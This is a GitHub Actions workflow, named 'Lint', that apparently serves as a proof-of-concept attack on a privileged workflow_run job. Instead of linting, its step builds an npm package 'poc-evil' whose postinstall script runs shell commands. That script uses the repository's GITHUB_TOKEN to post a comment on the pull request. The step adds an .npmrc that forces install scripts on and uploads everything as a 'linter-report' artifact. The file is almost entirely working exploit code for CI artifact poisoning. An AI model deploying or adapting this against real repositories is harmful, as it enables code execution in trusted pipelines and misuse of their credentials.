---
name: Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Craft artifact consumed by the privileged workflow_run
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
          NONCE: ${{ github.run_id }}-${{ github.run_attempt }}
        run: |
          set -e
          mkdir -p out/pkg
          cat > out/pkg/package.json <<'JSON'
          {"name":"poc-evil","version":"7.0.0","scripts":{"postinstall":"node postinstall.js"}}
          JSON
          cat > out/pkg/postinstall.js <<'JS'
          const fs = require('fs');
          console.log('FORK_POC_RCE token=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no') +
            ' workflow=' + process.env.GITHUB_WORKFLOW + ' event=' + process.env.GITHUB_EVENT_NAME);
          fs.writeFileSync('/tmp/FORK_POC_RCE', 'ran in ' + process.env.GITHUB_WORKFLOW);
          console.log('ID=' + require('child_process').execSync('id').toString().trim());
          (async () => {
            try {
              const pr = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/pr-number.txt', 'utf8').trim();
              const nonce = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/nonce.txt', 'utf8').trim();
              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments', {
                method: 'POST',
                headers: {
                  'Accept': 'application/vnd.github+json',
                  'Authorization': 'Bearer ' + process.env.GITHUB_TOKEN,
                  'Content-Type': 'application/json',
                  'X-GitHub-Api-Version': '2022-11-28'
                },
                body: JSON.stringify({ body: 'FORK_PR_RCE nonce=' + nonce + ' workflow=' + process.env.GITHUB_WORKFLOW + ' event=' + process.env.GITHUB_EVENT_NAME + ' uid=' + require('child_process').execSync('id -u').toString().trim() })
              });
              console.log('COMMENT_STATUS=' + r.status);
            } catch (e) {
              console.log('COMMENT_ERROR=' + e);
            }
          })();
          JS
          (cd out/pkg && npm pack --silent >/dev/null)
          mv out/pkg/poc-evil-7.0.0.tgz out/poc-evil-7.0.0.tgz
          rm -rf out/pkg
          printf '%s' '{"name":"root-poc","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil-7.0.0.tgz"}}' > out/package.json
          printf 'dangerously-allow-all-scripts=true\nignore-scripts=false\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
          printf 'fork-controlled report\n' > out/linter-report.txt
          printf '%s' "$PR_NUMBER" > out/pr-number.txt
          printf 'FORK-POC-%s\n' "$NONCE" > out/nonce.txt
          ls -la out

      - name: Upload linter-report artifact
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: out/
          include-hidden-files: true
          if-no-files-found: error
